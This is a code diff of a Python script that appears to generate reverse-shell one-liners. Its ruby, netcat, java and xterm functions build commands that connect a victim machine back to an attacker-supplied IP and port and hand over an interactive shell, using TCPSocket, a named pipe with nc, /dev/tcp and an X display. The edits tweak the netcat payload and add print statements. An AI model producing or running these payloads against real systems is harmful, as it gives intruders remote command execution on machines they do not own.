@@ -75,19 +75,18 @@ def php():
                 shGen(script)
                 print(script)
 
-def ruby():                
-                ipAddress='"'+ip+'"'
+def ruby():                                
                 script = "ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'"
                 shGen(script)
                 print(script)
 
-def netcat():
-                ipAddress='"'+ip+'"'
-                script = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" +ip+ ""+port+">/tmp/f"
+def netcat():                
+                script ="rm /tmp/f;mknod /tmp/f p; nc " +ip+ " "+port+" 0</tmp/f | /bin/sh 1>/tmp/f"                
                 shGen(script)
+                print(script)
 
 def java():
-                ipAddress='"'+ip+'"'  
+                  
                 script1 = "r = Runtime.getRuntime()"
                 script2 = "p = r.exec(["+"/bin/bash","-c","exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5;"
                 script3 = '"done"] as String[])"'
@@ -99,7 +98,7 @@ def java():
                 script=str(script1)+'\n'+str(script2)+'\n'+str(script3)+'\n'+str(script4)+'\n'
                 shGen(script)
 def xterm():
-                ipAddress='"'+ip+'"'
+
                 script = "xterm -display"+ip+":"+port+""
                 shGen(script)
                 print(script)
